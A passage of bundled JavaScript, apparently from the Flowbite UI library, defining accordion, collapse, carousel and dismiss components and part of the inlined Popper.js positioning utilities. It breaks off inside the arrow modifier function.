var Events = (
  /** @class */
  function() {
    function Events2(eventType, eventFunctions) {
      if (eventFunctions === void 0) {
        eventFunctions = [];
      }
      this._eventType = eventType;
      this._eventFunctions = eventFunctions;
    }
    Events2.prototype.init = function() {
      var _this = this;
      this._eventFunctions.forEach(function(eventFunction) {
        if (typeof window !== "undefined") {
          window.addEventListener(_this._eventType, eventFunction);
        }
      });
    };
    return Events2;
  }()
);
var Instances = (
  /** @class */
  function() {
    function Instances2() {
      this._instances = {
        Accordion: {},
        Carousel: {},
        Collapse: {},
        Dial: {},
        Dismiss: {},
        Drawer: {},
        Dropdown: {},
        Modal: {},
        Popover: {},
        Tabs: {},
        Tooltip: {},
        InputCounter: {},
        CopyClipboard: {},
        Datepicker: {}
      };
    }
    Instances2.prototype.addInstance = function(component, instance, id, override) {
      if (override === void 0) {
        override = false;
      }
      if (!this._instances[component]) {
        console.warn("Flowbite: Component ".concat(component, " does not exist."));
        return false;
      }
      if (this._instances[component][id] && !override) {
        console.warn("Flowbite: Instance with ID ".concat(id, " already exists."));
        return;
      }
      if (override && this._instances[component][id]) {
        this._instances[component][id].destroyAndRemoveInstance();
      }
      this._instances[component][id ? id : this._generateRandomId()] = instance;
    };
    Instances2.prototype.getAllInstances = function() {
      return this._instances;
    };
    Instances2.prototype.getInstances = function(component) {
      if (!this._instances[component]) {
        console.warn("Flowbite: Component ".concat(component, " does not exist."));
        return false;
      }
      return this._instances[component];
    };
    Instances2.prototype.getInstance = function(component, id) {
      if (!this._componentAndInstanceCheck(component, id)) {
        return;
      }
      if (!this._instances[component][id]) {
        console.warn("Flowbite: Instance with ID ".concat(id, " does not exist."));
        return;
      }
      return this._instances[component][id];
    };
    Instances2.prototype.destroyAndRemoveInstance = function(component, id) {
      if (!this._componentAndInstanceCheck(component, id)) {
        return;
      }
      this.destroyInstanceObject(component, id);
      this.removeInstance(component, id);
    };
    Instances2.prototype.removeInstance = function(component, id) {
      if (!this._componentAndInstanceCheck(component, id)) {
        return;
      }
      delete this._instances[component][id];
    };
    Instances2.prototype.destroyInstanceObject = function(component, id) {
      if (!this._componentAndInstanceCheck(component, id)) {
        return;
      }
      this._instances[component][id].destroy();
    };
    Instances2.prototype.instanceExists = function(component, id) {
      if (!this._instances[component]) {
        return false;
      }
      if (!this._instances[component][id]) {
        return false;
      }
      return true;
    };
    Instances2.prototype._generateRandomId = function() {
      return Math.random().toString(36).substr(2, 9);
    };
    Instances2.prototype._componentAndInstanceCheck = function(component, id) {
      if (!this._instances[component]) {
        console.warn("Flowbite: Component ".concat(component, " does not exist."));
        return false;
      }
      if (!this._instances[component][id]) {
        console.warn("Flowbite: Instance with ID ".concat(id, " does not exist."));
        return false;
      }
      return true;
    };
    return Instances2;
  }()
);
var instances = new Instances();
if (typeof window !== "undefined") {
  window.FlowbiteInstances = instances;
}
var __assign$d = function() {
  __assign$d = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$d.apply(this, arguments);
};
var Default$d = {
  alwaysOpen: false,
  activeClasses: "bg-gray-100 dark:bg-gray-800 text-gray-900 dark:text-white",
  inactiveClasses: "text-gray-500 dark:text-gray-400",
  onOpen: function() {
  },
  onClose: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$d = {
  id: null,
  override: true
};
var Accordion = (
  /** @class */
  function() {
    function Accordion2(accordionEl, items, options, instanceOptions) {
      if (accordionEl === void 0) {
        accordionEl = null;
      }
      if (items === void 0) {
        items = [];
      }
      if (options === void 0) {
        options = Default$d;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$d;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : accordionEl.id;
      this._accordionEl = accordionEl;
      this._items = items;
      this._options = __assign$d(__assign$d({}, Default$d), options);
      this._initialized = false;
      this.init();
      instances.addInstance("Accordion", this, this._instanceId, instanceOptions.override);
    }
    Accordion2.prototype.init = function() {
      var _this = this;
      if (this._items.length && !this._initialized) {
        this._items.forEach(function(item) {
          if (item.active) {
            _this.open(item.id);
          }
          var clickHandler = function() {
            _this.toggle(item.id);
          };
          item.triggerEl.addEventListener("click", clickHandler);
          item.clickHandler = clickHandler;
        });
        this._initialized = true;
      }
    };
    Accordion2.prototype.destroy = function() {
      if (this._items.length && this._initialized) {
        this._items.forEach(function(item) {
          item.triggerEl.removeEventListener("click", item.clickHandler);
          delete item.clickHandler;
        });
        this._initialized = false;
      }
    };
    Accordion2.prototype.removeInstance = function() {
      instances.removeInstance("Accordion", this._instanceId);
    };
    Accordion2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Accordion2.prototype.getItem = function(id) {
      return this._items.filter(function(item) {
        return item.id === id;
      })[0];
    };
    Accordion2.prototype.open = function(id) {
      var _a, _b;
      var _this = this;
      var item = this.getItem(id);
      if (!this._options.alwaysOpen) {
        this._items.map(function(i2) {
          var _a2, _b2;
          if (i2 !== item) {
            (_a2 = i2.triggerEl.classList).remove.apply(_a2, _this._options.activeClasses.split(" "));
            (_b2 = i2.triggerEl.classList).add.apply(_b2, _this._options.inactiveClasses.split(" "));
            i2.targetEl.classList.add("hidden");
            i2.triggerEl.setAttribute("aria-expanded", "false");
            i2.active = false;
            if (i2.iconEl) {
              i2.iconEl.classList.add("rotate-180");
            }
          }
        });
      }
      (_a = item.triggerEl.classList).add.apply(_a, this._options.activeClasses.split(" "));
      (_b = item.triggerEl.classList).remove.apply(_b, this._options.inactiveClasses.split(" "));
      item.triggerEl.setAttribute("aria-expanded", "true");
      item.targetEl.classList.remove("hidden");
      item.active = true;
      if (item.iconEl) {
        item.iconEl.classList.remove("rotate-180");
      }
      this._options.onOpen(this, item);
    };
    Accordion2.prototype.toggle = function(id) {
      var item = this.getItem(id);
      if (item.active) {
        this.close(id);
      } else {
        this.open(id);
      }
      this._options.onToggle(this, item);
    };
    Accordion2.prototype.close = function(id) {
      var _a, _b;
      var item = this.getItem(id);
      (_a = item.triggerEl.classList).remove.apply(_a, this._options.activeClasses.split(" "));
      (_b = item.triggerEl.classList).add.apply(_b, this._options.inactiveClasses.split(" "));
      item.targetEl.classList.add("hidden");
      item.triggerEl.setAttribute("aria-expanded", "false");
      item.active = false;
      if (item.iconEl) {
        item.iconEl.classList.add("rotate-180");
      }
      this._options.onClose(this, item);
    };
    Accordion2.prototype.updateOnOpen = function(callback) {
      this._options.onOpen = callback;
    };
    Accordion2.prototype.updateOnClose = function(callback) {
      this._options.onClose = callback;
    };
    Accordion2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Accordion2;
  }()
);
function initAccordions() {
  document.querySelectorAll("[data-accordion]").forEach(function($accordionEl) {
    var alwaysOpen = $accordionEl.getAttribute("data-accordion");
    var activeClasses = $accordionEl.getAttribute("data-active-classes");
    var inactiveClasses = $accordionEl.getAttribute("data-inactive-classes");
    var items = [];
    $accordionEl.querySelectorAll("[data-accordion-target]").forEach(function($triggerEl) {
      if ($triggerEl.closest("[data-accordion]") === $accordionEl) {
        var item = {
          id: $triggerEl.getAttribute("data-accordion-target"),
          triggerEl: $triggerEl,
          targetEl: document.querySelector($triggerEl.getAttribute("data-accordion-target")),
          iconEl: $triggerEl.querySelector("[data-accordion-icon]"),
          active: $triggerEl.getAttribute("aria-expanded") === "true" ? true : false
        };
        items.push(item);
      }
    });
    new Accordion($accordionEl, items, {
      alwaysOpen: alwaysOpen === "open" ? true : false,
      activeClasses: activeClasses ? activeClasses : Default$d.activeClasses,
      inactiveClasses: inactiveClasses ? inactiveClasses : Default$d.inactiveClasses
    });
  });
}
if (typeof window !== "undefined") {
  window.Accordion = Accordion;
  window.initAccordions = initAccordions;
}
var __assign$c = function() {
  __assign$c = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$c.apply(this, arguments);
};
var Default$c = {
  onCollapse: function() {
  },
  onExpand: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$c = {
  id: null,
  override: true
};
var Collapse = (
  /** @class */
  function() {
    function Collapse2(targetEl, triggerEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (triggerEl === void 0) {
        triggerEl = null;
      }
      if (options === void 0) {
        options = Default$c;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$c;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._triggerEl = triggerEl;
      this._options = __assign$c(__assign$c({}, Default$c), options);
      this._visible = false;
      this._initialized = false;
      this.init();
      instances.addInstance("Collapse", this, this._instanceId, instanceOptions.override);
    }
    Collapse2.prototype.init = function() {
      var _this = this;
      if (this._triggerEl && this._targetEl && !this._initialized) {
        if (this._triggerEl.hasAttribute("aria-expanded")) {
          this._visible = this._triggerEl.getAttribute("aria-expanded") === "true";
        } else {
          this._visible = !this._targetEl.classList.contains("hidden");
        }
        this._clickHandler = function() {
          _this.toggle();
        };
        this._triggerEl.addEventListener("click", this._clickHandler);
        this._initialized = true;
      }
    };
    Collapse2.prototype.destroy = function() {
      if (this._triggerEl && this._initialized) {
        this._triggerEl.removeEventListener("click", this._clickHandler);
        this._initialized = false;
      }
    };
    Collapse2.prototype.removeInstance = function() {
      instances.removeInstance("Collapse", this._instanceId);
    };
    Collapse2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Collapse2.prototype.collapse = function() {
      this._targetEl.classList.add("hidden");
      if (this._triggerEl) {
        this._triggerEl.setAttribute("aria-expanded", "false");
      }
      this._visible = false;
      this._options.onCollapse(this);
    };
    Collapse2.prototype.expand = function() {
      this._targetEl.classList.remove("hidden");
      if (this._triggerEl) {
        this._triggerEl.setAttribute("aria-expanded", "true");
      }
      this._visible = true;
      this._options.onExpand(this);
    };
    Collapse2.prototype.toggle = function() {
      if (this._visible) {
        this.collapse();
      } else {
        this.expand();
      }
      this._options.onToggle(this);
    };
    Collapse2.prototype.updateOnCollapse = function(callback) {
      this._options.onCollapse = callback;
    };
    Collapse2.prototype.updateOnExpand = function(callback) {
      this._options.onExpand = callback;
    };
    Collapse2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Collapse2;
  }()
);
function initCollapses() {
  document.querySelectorAll("[data-collapse-toggle]").forEach(function($triggerEl) {
    var targetId = $triggerEl.getAttribute("data-collapse-toggle");
    var $targetEl = document.getElementById(targetId);
    if ($targetEl) {
      if (!instances.instanceExists("Collapse", $targetEl.getAttribute("id"))) {
        new Collapse($targetEl, $triggerEl);
      } else {
        new Collapse($targetEl, $triggerEl, {}, {
          id: $targetEl.getAttribute("id") + "_" + instances._generateRandomId()
        });
      }
    } else {
      console.error('The target element with id "'.concat(targetId, '" does not exist. Please check the data-collapse-toggle attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.Collapse = Collapse;
  window.initCollapses = initCollapses;
}
var __assign$b = function() {
  __assign$b = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$b.apply(this, arguments);
};
var Default$b = {
  defaultPosition: 0,
  indicators: {
    items: [],
    activeClasses: "bg-white dark:bg-gray-800",
    inactiveClasses: "bg-white/50 dark:bg-gray-800/50 hover:bg-white dark:hover:bg-gray-800"
  },
  interval: 3e3,
  onNext: function() {
  },
  onPrev: function() {
  },
  onChange: function() {
  }
};
var DefaultInstanceOptions$b = {
  id: null,
  override: true
};
var Carousel = (
  /** @class */
  function() {
    function Carousel2(carouselEl, items, options, instanceOptions) {
      if (carouselEl === void 0) {
        carouselEl = null;
      }
      if (items === void 0) {
        items = [];
      }
      if (options === void 0) {
        options = Default$b;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$b;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : carouselEl.id;
      this._carouselEl = carouselEl;
      this._items = items;
      this._options = __assign$b(__assign$b(__assign$b({}, Default$b), options), { indicators: __assign$b(__assign$b({}, Default$b.indicators), options.indicators) });
      this._activeItem = this.getItem(this._options.defaultPosition);
      this._indicators = this._options.indicators.items;
      this._intervalDuration = this._options.interval;
      this._intervalInstance = null;
      this._initialized = false;
      this.init();
      instances.addInstance("Carousel", this, this._instanceId, instanceOptions.override);
    }
    Carousel2.prototype.init = function() {
      var _this = this;
      if (this._items.length && !this._initialized) {
        this._items.map(function(item) {
          item.el.classList.add("absolute", "inset-0", "transition-transform", "transform");
        });
        if (this.getActiveItem()) {
          this.slideTo(this.getActiveItem().position);
        } else {
          this.slideTo(0);
        }
        this._indicators.map(function(indicator, position) {
          indicator.el.addEventListener("click", function() {
            _this.slideTo(position);
          });
        });
        this._initialized = true;
      }
    };
    Carousel2.prototype.destroy = function() {
      if (this._initialized) {
        this._initialized = false;
      }
    };
    Carousel2.prototype.removeInstance = function() {
      instances.removeInstance("Carousel", this._instanceId);
    };
    Carousel2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Carousel2.prototype.getItem = function(position) {
      return this._items[position];
    };
    Carousel2.prototype.slideTo = function(position) {
      var nextItem = this._items[position];
      var rotationItems = {
        left: nextItem.position === 0 ? this._items[this._items.length - 1] : this._items[nextItem.position - 1],
        middle: nextItem,
        right: nextItem.position === this._items.length - 1 ? this._items[0] : this._items[nextItem.position + 1]
      };
      this._rotate(rotationItems);
      this._setActiveItem(nextItem);
      if (this._intervalInstance) {
        this.pause();
        this.cycle();
      }
      this._options.onChange(this);
    };
    Carousel2.prototype.next = function() {
      var activeItem = this.getActiveItem();
      var nextItem = null;
      if (activeItem.position === this._items.length - 1) {
        nextItem = this._items[0];
      } else {
        nextItem = this._items[activeItem.position + 1];
      }
      this.slideTo(nextItem.position);
      this._options.onNext(this);
    };
    Carousel2.prototype.prev = function() {
      var activeItem = this.getActiveItem();
      var prevItem = null;
      if (activeItem.position === 0) {
        prevItem = this._items[this._items.length - 1];
      } else {
        prevItem = this._items[activeItem.position - 1];
      }
      this.slideTo(prevItem.position);
      this._options.onPrev(this);
    };
    Carousel2.prototype._rotate = function(rotationItems) {
      this._items.map(function(item) {
        item.el.classList.add("hidden");
      });
      if (this._items.length === 1) {
        rotationItems.middle.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-10");
        rotationItems.middle.el.classList.add("translate-x-0", "z-20");
        return;
      }
      rotationItems.left.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-20");
      rotationItems.left.el.classList.add("-translate-x-full", "z-10");
      rotationItems.middle.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-10");
      rotationItems.middle.el.classList.add("translate-x-0", "z-30");
      rotationItems.right.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-30");
      rotationItems.right.el.classList.add("translate-x-full", "z-20");
    };
    Carousel2.prototype.cycle = function() {
      var _this = this;
      if (typeof window !== "undefined") {
        this._intervalInstance = window.setInterval(function() {
          _this.next();
        }, this._intervalDuration);
      }
    };
    Carousel2.prototype.pause = function() {
      clearInterval(this._intervalInstance);
    };
    Carousel2.prototype.getActiveItem = function() {
      return this._activeItem;
    };
    Carousel2.prototype._setActiveItem = function(item) {
      var _a, _b;
      var _this = this;
      this._activeItem = item;
      var position = item.position;
      if (this._indicators.length) {
        this._indicators.map(function(indicator) {
          var _a2, _b2;
          indicator.el.setAttribute("aria-current", "false");
          (_a2 = indicator.el.classList).remove.apply(_a2, _this._options.indicators.activeClasses.split(" "));
          (_b2 = indicator.el.classList).add.apply(_b2, _this._options.indicators.inactiveClasses.split(" "));
        });
        (_a = this._indicators[position].el.classList).add.apply(_a, this._options.indicators.activeClasses.split(" "));
        (_b = this._indicators[position].el.classList).remove.apply(_b, this._options.indicators.inactiveClasses.split(" "));
        this._indicators[position].el.setAttribute("aria-current", "true");
      }
    };
    Carousel2.prototype.updateOnNext = function(callback) {
      this._options.onNext = callback;
    };
    Carousel2.prototype.updateOnPrev = function(callback) {
      this._options.onPrev = callback;
    };
    Carousel2.prototype.updateOnChange = function(callback) {
      this._options.onChange = callback;
    };
    return Carousel2;
  }()
);
function initCarousels() {
  document.querySelectorAll("[data-carousel]").forEach(function($carouselEl) {
    var interval = $carouselEl.getAttribute("data-carousel-interval");
    var slide = $carouselEl.getAttribute("data-carousel") === "slide" ? true : false;
    var items = [];
    var defaultPosition = 0;
    if ($carouselEl.querySelectorAll("[data-carousel-item]").length) {
      Array.from($carouselEl.querySelectorAll("[data-carousel-item]")).map(function($carouselItemEl, position) {
        items.push({
          position,
          el: $carouselItemEl
        });
        if ($carouselItemEl.getAttribute("data-carousel-item") === "active") {
          defaultPosition = position;
        }
      });
    }
    var indicators = [];
    if ($carouselEl.querySelectorAll("[data-carousel-slide-to]").length) {
      Array.from($carouselEl.querySelectorAll("[data-carousel-slide-to]")).map(function($indicatorEl) {
        indicators.push({
          position: parseInt($indicatorEl.getAttribute("data-carousel-slide-to")),
          el: $indicatorEl
        });
      });
    }
    var carousel = new Carousel($carouselEl, items, {
      defaultPosition,
      indicators: {
        items: indicators
      },
      interval: interval ? interval : Default$b.interval
    });
    if (slide) {
      carousel.cycle();
    }
    var carouselNextEl = $carouselEl.querySelector("[data-carousel-next]");
    var carouselPrevEl = $carouselEl.querySelector("[data-carousel-prev]");
    if (carouselNextEl) {
      carouselNextEl.addEventListener("click", function() {
        carousel.next();
      });
    }
    if (carouselPrevEl) {
      carouselPrevEl.addEventListener("click", function() {
        carousel.prev();
      });
    }
  });
}
if (typeof window !== "undefined") {
  window.Carousel = Carousel;
  window.initCarousels = initCarousels;
}
var __assign$a = function() {
  __assign$a = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$a.apply(this, arguments);
};
var Default$a = {
  transition: "transition-opacity",
  duration: 300,
  timing: "ease-out",
  onHide: function() {
  }
};
var DefaultInstanceOptions$a = {
  id: null,
  override: true
};
var Dismiss = (
  /** @class */
  function() {
    function Dismiss2(targetEl, triggerEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (triggerEl === void 0) {
        triggerEl = null;
      }
      if (options === void 0) {
        options = Default$a;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$a;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._triggerEl = triggerEl;
      this._options = __assign$a(__assign$a({}, Default$a), options);
      this._initialized = false;
      this.init();
      instances.addInstance("Dismiss", this, this._instanceId, instanceOptions.override);
    }
    Dismiss2.prototype.init = function() {
      var _this = this;
      if (this._triggerEl && this._targetEl && !this._initialized) {
        this._clickHandler = function() {
          _this.hide();
        };
        this._triggerEl.addEventListener("click", this._clickHandler);
        this._initialized = true;
      }
    };
    Dismiss2.prototype.destroy = function() {
      if (this._triggerEl && this._initialized) {
        this._triggerEl.removeEventListener("click", this._clickHandler);
        this._initialized = false;
      }
    };
    Dismiss2.prototype.removeInstance = function() {
      instances.removeInstance("Dismiss", this._instanceId);
    };
    Dismiss2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Dismiss2.prototype.hide = function() {
      var _this = this;
      this._targetEl.classList.add(this._options.transition, "duration-".concat(this._options.duration), this._options.timing, "opacity-0");
      setTimeout(function() {
        _this._targetEl.classList.add("hidden");
      }, this._options.duration);
      this._options.onHide(this, this._targetEl);
    };
    Dismiss2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    return Dismiss2;
  }()
);
function initDismisses() {
  document.querySelectorAll("[data-dismiss-target]").forEach(function($triggerEl) {
    var targetId = $triggerEl.getAttribute("data-dismiss-target");
    var $dismissEl = document.querySelector(targetId);
    if ($dismissEl) {
      new Dismiss($dismissEl, $triggerEl);
    } else {
      console.error('The dismiss element with id "'.concat(targetId, '" does not exist. Please check the data-dismiss-target attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.Dismiss = Dismiss;
  window.initDismisses = initDismisses;
}
var top = "top";
var bottom = "bottom";
var right = "right";
var left = "left";
var auto = "auto";
var basePlacements = [top, bottom, right, left];
var start = "start";
var end = "end";
var clippingParents = "clippingParents";
var viewport = "viewport";
var popper = "popper";
var reference = "reference";
var variationPlacements = /* @__PURE__ */ basePlacements.reduce(function(acc, placement) {
  return acc.concat([placement + "-" + start, placement + "-" + end]);
}, []);
var placements = /* @__PURE__ */ [].concat(basePlacements, [auto]).reduce(function(acc, placement) {
  return acc.concat([placement, placement + "-" + start, placement + "-" + end]);
}, []);
var beforeRead = "beforeRead";
var read = "read";
var afterRead = "afterRead";
var beforeMain = "beforeMain";
var main = "main";
var afterMain = "afterMain";
var beforeWrite = "beforeWrite";
var write = "write";
var afterWrite = "afterWrite";
var modifierPhases = [beforeRead, read, afterRead, beforeMain, main, afterMain, beforeWrite, write, afterWrite];
function getNodeName(element) {
  return element ? (element.nodeName || "").toLowerCase() : null;
}
function getWindow(node) {
  if (node == null) {
    return window;
  }
  if (node.toString() !== "[object Window]") {
    var ownerDocument = node.ownerDocument;
    return ownerDocument ? ownerDocument.defaultView || window : window;
  }
  return node;
}
function isElement$1(node) {
  var OwnElement = getWindow(node).Element;
  return node instanceof OwnElement || node instanceof Element;
}
function isHTMLElement(node) {
  var OwnElement = getWindow(node).HTMLElement;
  return node instanceof OwnElement || node instanceof HTMLElement;
}
function isShadowRoot(node) {
  if (typeof ShadowRoot === "undefined") {
    return false;
  }
  var OwnElement = getWindow(node).ShadowRoot;
  return node instanceof OwnElement || node instanceof ShadowRoot;
}
function applyStyles$1(_ref) {
  var state = _ref.state;
  Object.keys(state.elements).forEach(function(name) {
    var style = state.styles[name] || {};
    var attributes = state.attributes[name] || {};
    var element = state.elements[name];
    if (!isHTMLElement(element) || !getNodeName(element)) {
      return;
    }
    Object.assign(element.style, style);
    Object.keys(attributes).forEach(function(name2) {
      var value = attributes[name2];
      if (value === false) {
        element.removeAttribute(name2);
      } else {
        element.setAttribute(name2, value === true ? "" : value);
      }
    });
  });
}
function effect$2(_ref2) {
  var state = _ref2.state;
  var initialStyles = {
    popper: {
      position: state.options.strategy,
      left: "0",
      top: "0",
      margin: "0"
    },
    arrow: {
      position: "absolute"
    },
    reference: {}
  };
  Object.assign(state.elements.popper.style, initialStyles.popper);
  state.styles = initialStyles;
  if (state.elements.arrow) {
    Object.assign(state.elements.arrow.style, initialStyles.arrow);
  }
  return function() {
    Object.keys(state.elements).forEach(function(name) {
      var element = state.elements[name];
      var attributes = state.attributes[name] || {};
      var styleProperties = Object.keys(state.styles.hasOwnProperty(name) ? state.styles[name] : initialStyles[name]);
      var style = styleProperties.reduce(function(style2, property) {
        style2[property] = "";
        return style2;
      }, {});
      if (!isHTMLElement(element) || !getNodeName(element)) {
        return;
      }
      Object.assign(element.style, style);
      Object.keys(attributes).forEach(function(attribute) {
        element.removeAttribute(attribute);
      });
    });
  };
}
const applyStyles$2 = {
  name: "applyStyles",
  enabled: true,
  phase: "write",
  fn: applyStyles$1,
  effect: effect$2,
  requires: ["computeStyles"]
};
function getBasePlacement(placement) {
  return placement.split("-")[0];
}
var max = Math.max;
var min = Math.min;
var round = Math.round;
function getUAString() {
  var uaData = navigator.userAgentData;
  if (uaData != null && uaData.brands && Array.isArray(uaData.brands)) {
    return uaData.brands.map(function(item) {
      return item.brand + "/" + item.version;
    }).join(" ");
  }
  return navigator.userAgent;
}
function isLayoutViewport() {
  return !/^((?!chrome|android).)*safari/i.test(getUAString());
}
function getBoundingClientRect(element, includeScale, isFixedStrategy) {
  if (includeScale === void 0) {
    includeScale = false;
  }
  if (isFixedStrategy === void 0) {
    isFixedStrategy = false;
  }
  var clientRect = element.getBoundingClientRect();
  var scaleX = 1;
  var scaleY = 1;
  if (includeScale && isHTMLElement(element)) {
    scaleX = element.offsetWidth > 0 ? round(clientRect.width) / element.offsetWidth || 1 : 1;
    scaleY = element.offsetHeight > 0 ? round(clientRect.height) / element.offsetHeight || 1 : 1;
  }
  var _ref = isElement$1(element) ? getWindow(element) : window, visualViewport = _ref.visualViewport;
  var addVisualOffsets = !isLayoutViewport() && isFixedStrategy;
  var x = (clientRect.left + (addVisualOffsets && visualViewport ? visualViewport.offsetLeft : 0)) / scaleX;
  var y3 = (clientRect.top + (addVisualOffsets && visualViewport ? visualViewport.offsetTop : 0)) / scaleY;
  var width = clientRect.width / scaleX;
  var height = clientRect.height / scaleY;
  return {
    width,
    height,
    top: y3,
    right: x + width,
    bottom: y3 + height,
    left: x,
    x,
    y: y3
  };
}
function getLayoutRect(element) {
  var clientRect = getBoundingClientRect(element);
  var width = element.offsetWidth;
  var height = element.offsetHeight;
  if (Math.abs(clientRect.width - width) <= 1) {
    width = clientRect.width;
  }
  if (Math.abs(clientRect.height - height) <= 1) {
    height = clientRect.height;
  }
  return {
    x: element.offsetLeft,
    y: element.offsetTop,
    width,
    height
  };
}
function contains(parent, child) {
  var rootNode = child.getRootNode && child.getRootNode();
  if (parent.contains(child)) {
    return true;
  } else if (rootNode && isShadowRoot(rootNode)) {
    var next = child;
    do {
      if (next && parent.isSameNode(next)) {
        return true;
      }
      next = next.parentNode || next.host;
    } while (next);
  }
  return false;
}
function getComputedStyle(element) {
  return getWindow(element).getComputedStyle(element);
}
function isTableElement(element) {
  return ["table", "td", "th"].indexOf(getNodeName(element)) >= 0;
}
function getDocumentElement(element) {
  return ((isElement$1(element) ? element.ownerDocument : (
    // $FlowFixMe[prop-missing]
    element.document
  )) || window.document).documentElement;
}
function getParentNode(element) {
  if (getNodeName(element) === "html") {
    return element;
  }
  return (
    // this is a quicker (but less type safe) way to save quite some bytes from the bundle
    // $FlowFixMe[incompatible-return]
    // $FlowFixMe[prop-missing]
    element.assignedSlot || // step into the shadow DOM of the parent of a slotted node
    element.parentNode || // DOM Element detected
    (isShadowRoot(element) ? element.host : null) || // ShadowRoot detected
    // $FlowFixMe[incompatible-call]: HTMLElement is a Node
    getDocumentElement(element)
  );
}
function getTrueOffsetParent(element) {
  if (!isHTMLElement(element) || // https://github.com/popperjs/popper-core/issues/837
  getComputedStyle(element).position === "fixed") {
    return null;
  }
  return element.offsetParent;
}
function getContainingBlock(element) {
  var isFirefox = /firefox/i.test(getUAString());
  var isIE = /Trident/i.test(getUAString());
  if (isIE && isHTMLElement(element)) {
    var elementCss = getComputedStyle(element);
    if (elementCss.position === "fixed") {
      return null;
    }
  }
  var currentNode = getParentNode(element);
  if (isShadowRoot(currentNode)) {
    currentNode = currentNode.host;
  }
  while (isHTMLElement(currentNode) && ["html", "body"].indexOf(getNodeName(currentNode)) < 0) {
    var css = getComputedStyle(currentNode);
    if (css.transform !== "none" || css.perspective !== "none" || css.contain === "paint" || ["transform", "perspective"].indexOf(css.willChange) !== -1 || isFirefox && css.willChange === "filter" || isFirefox && css.filter && css.filter !== "none") {
      return currentNode;
    } else {
      currentNode = currentNode.parentNode;
    }
  }
  return null;
}
function getOffsetParent(element) {
  var window2 = getWindow(element);
  var offsetParent = getTrueOffsetParent(element);
  while (offsetParent && isTableElement(offsetParent) && getComputedStyle(offsetParent).position === "static") {
    offsetParent = getTrueOffsetParent(offsetParent);
  }
  if (offsetParent && (getNodeName(offsetParent) === "html" || getNodeName(offsetParent) === "body" && getComputedStyle(offsetParent).position === "static")) {
    return window2;
  }
  return offsetParent || getContainingBlock(element) || window2;
}
function getMainAxisFromPlacement(placement) {
  return ["top", "bottom"].indexOf(placement) >= 0 ? "x" : "y";
}
function within(min$1, value, max$1) {
  return max(min$1, min(value, max$1));
}
function withinMaxClamp(min2, value, max2) {
  var v = within(min2, value, max2);
  return v > max2 ? max2 : v;
}
function getFreshSideObject() {
  return {
    top: 0,
    right: 0,
    bottom: 0,
    left: 0
  };
}
function mergePaddingObject(paddingObject) {
  return Object.assign({}, getFreshSideObject(), paddingObject);
}
function expandToHashMap(value, keys) {
  return keys.reduce(function(hashMap, key) {
    hashMap[key] = value;
    return hashMap;
  }, {});
}
var toPaddingObject = function toPaddingObject2(padding, state) {
  padding = typeof padding === "function" ? padding(Object.assign({}, state.rects, {
    placement: state.placement
  })) : padding;
  return mergePaddingObject(typeof padding !== "number" ? padding : expandToHashMap(padding, basePlacements));
};
function arrow(_ref) {
  var _state$modifiersData$;
  var state = _ref.state, name = _ref.name, options = _ref.options;
  var arrowElement = state.elements.arrow;
  var popperOffsets2 = state.modifiersData.popperOffsets;
  var basePlacement = getBasePlacement(state.placement);
  var axis = getMainAxisFromPlacement(basePlacement);
  var isVertical = [left, right].indexOf(basePlacement) >= 0;
  var len = isVertical ? "height" : "width";
  if (!arrowElement || !popperOffsets2) {
    return;
  }
  var paddingObject = toPaddingObject(options.padding, state);
  var arrowRect = getLayoutRect(arrowElement);
  var minProp = axis === "y" ? top : left;
  var maxProp = axis === "y" ? bottom : right;
  var endDiff = state.rects.reference[len] + state.rects.reference[axis] - popperOffsets2[axis] - state.rects.popper[len];
  var startDiff = popperOffsets2[axis] - state.rects.reference[axis];
  var arrowOffsetParent = getOffsetParent(arrowElement);
